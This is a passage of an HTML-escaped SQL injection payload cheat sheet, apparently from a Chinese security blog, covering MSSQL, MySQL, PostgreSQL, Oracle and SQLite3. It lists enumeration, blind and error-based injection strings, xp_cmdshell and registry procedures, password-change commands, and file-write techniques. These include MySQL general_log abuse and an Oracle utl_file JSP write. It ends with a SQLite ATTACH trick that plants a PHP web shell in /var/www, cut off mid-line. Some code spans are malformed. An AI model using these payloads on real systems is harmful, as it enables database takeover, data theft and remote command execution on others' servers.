&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT char(65)+char(66)&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;AB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Delay&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:3&#39;&lt;/code&gt;  pause for 3 seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change Password&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ALTER LOGIN [sa] WITH PASSWORD=N&#39;NewPassword&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Trick&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=1 union:select password from:user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件读取&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenRowset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当前查询语句&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hostname&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于判断是否站库分离&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select host_name()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exec xp_getnetname&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exec xp_msver&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select * from sys.configurations;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册表读写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表读写&#34;&gt;#&lt;/a&gt; 注册表读写&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regread&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exec xp_regread N&#39;HKEY_LOCAL_MACHINE&#39;, N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regwrite&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regdeletvalue&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regdeletkey&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regaddmultistring&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;报错注入-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入-2&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1=convert(int,(db_name()))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;SUSER_NAME()&lt;/li&gt;
&lt;li&gt;USER_NAME()&lt;/li&gt;
&lt;li&gt;PERMISSIONS()&lt;/li&gt;
&lt;li&gt;DB_NAME()&lt;/li&gt;
&lt;li&gt;FILE_NAME()&lt;/li&gt;
&lt;li&gt;TYPE_NAME()&lt;/li&gt;
&lt;li&gt;COL_NAME()&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-oob&#34;&gt;#&lt;/a&gt; DNS OOB&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fn_xe_file_target_read_file&lt;/li&gt;
&lt;li&gt;fn_get_audit_file&lt;/li&gt;
&lt;li&gt;fn_trace_gettable&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;其他常用存储过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他常用存储过程&#34;&gt;#&lt;/a&gt; 其他常用存储过程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;sp_execute_external_script&lt;/li&gt;
&lt;li&gt;sp_makewebtask&lt;/li&gt;
&lt;li&gt;sp_OACreate&lt;/li&gt;
&lt;li&gt;sp_OADestroy&lt;/li&gt;
&lt;li&gt;sp_OAGetErrorInfo&lt;/li&gt;
&lt;li&gt;sp_OAGetProperty&lt;/li&gt;
&lt;li&gt;sp_OAMethod&lt;/li&gt;
&lt;li&gt;sp_OASetProperty&lt;/li&gt;
&lt;li&gt;sp_OAStop&lt;/li&gt;
&lt;li&gt;xp_cmdshell&lt;/li&gt;
&lt;li&gt;xp_dirtree&lt;/li&gt;
&lt;li&gt;xp_enumerrorlogs&lt;/li&gt;
&lt;li&gt;xp_enumgroups&lt;/li&gt;
&lt;li&gt;xp_fixeddrives&lt;/li&gt;
&lt;li&gt;xp_getfiledetails&lt;/li&gt;
&lt;li&gt;xp_loginconfig&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mysql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-payload&#34;&gt;#&lt;/a&gt; MySQL Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-2&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Version&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 # comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x9&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;   &lt;code&gt;0xa0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Current User&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT system_user()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT current_role()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List User&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user FROM mysql.user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Current Database&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT database()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Database&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT schema_name FROM information_schema.schemata&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Tables&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Columns&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT if(1=1,&#39;foo&#39;,&#39;bar&#39;);&lt;/code&gt;  return &#39;foo&#39;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ascii&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;`SELECT char(0x41)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 0x414243&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;ABC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Delay&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Read File&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select @@datadir``select load_file(&#39;databasename/tablename.MYD&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Blind&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ascii(substring(str,pos,length)) &amp;amp; 32 = 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Error Based&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change Password&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql -uroot -e &amp;quot;use mysql;UPDATE user SET password=PASSWORD(&#39;newpassword&#39;) WHERE user=&#39;root&#39;;FLUSH PRIVILEGES;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;报错注入常见函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入常见函数&#34;&gt;#&lt;/a&gt; 报错注入常见函数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;extractvalue&lt;/li&gt;
&lt;li&gt;updatexml&lt;/li&gt;
&lt;li&gt;GeometryCollection&lt;/li&gt;
&lt;li&gt;linestring&lt;/li&gt;
&lt;li&gt;multilinestring&lt;/li&gt;
&lt;li&gt;multipoint&lt;/li&gt;
&lt;li&gt;multipolygon&lt;/li&gt;
&lt;li&gt;polygon&lt;/li&gt;
&lt;li&gt;exp&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
&lt;h4 id=&#34;写文件前提&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件前提&#34;&gt;#&lt;/a&gt; 写文件前提&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;root 权限&lt;/li&gt;
&lt;li&gt;知晓文件绝对路径&lt;/li&gt;
&lt;li&gt;写入的路径存在写入权限&lt;/li&gt;
&lt;li&gt;secure_file_priv 允许向对应位置写入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select count(file_priv) from mysql.user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;基于into写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于into写文件&#34;&gt;#&lt;/a&gt; 基于 into 写文件&lt;/h4&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏&lt;/p&gt;
&lt;h4 id=&#34;基于log写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于log写文件&#34;&gt;#&lt;/a&gt; 基于 log 写文件&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;show variables like &#39;%general%&#39;;
set global general_log = on;
set global general_log_file = &#39;/path/to/file&#39;;
select &#39;&amp;lt;?php var_dump(&amp;quot;test&amp;quot;);?&amp;gt;&#39;;
set global general_log_file = &#39;/original/path&#39;;
set global general_log = off;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;postgressql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgressql-payload&#34;&gt;#&lt;/a&gt; PostgresSQL Payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Comment
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment``SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current User
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT current_user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``SELECT session_user`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT getpgusername()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List User
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT usename FROM pg_user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current Database
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT current_database()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List Database
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT datname FROM pg_database&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ascii
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Delay
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oracle-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle-payload&#34;&gt;#&lt;/a&gt; Oracle Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-3&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dump&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = &#39;table_name&#39;;``select column_name, data_type from user_tab_columns where table_name = &#39;table_name&#39;;``SELECT * FROM ALL_TABLES&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--``/**/&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0x00&lt;/code&gt;   &lt;code&gt;0x09&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;OOB&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rawtohex&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;写文件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件-2&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/path/to/dir&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;grant&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; system&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;declare&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;file_type&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file :&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;TEST_DIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test.jsp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;W&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;% out.println(&#34;test&#34;); %&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fflush&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fclose&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;sqlite3-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlite3-payload&#34;&gt;#&lt;/a&gt; SQLite3 Payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Comment
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/**/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select sqlite_version();&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Command Execution&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ATTACH &lt;span class=&#34;token keyword&#34;&gt;DATABASE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/lol.php&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?system($_GET[&#39;&lt;/span&gt;cmd&lt;span class=&#34;token string&#34;&gt;&#39;]); ?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token 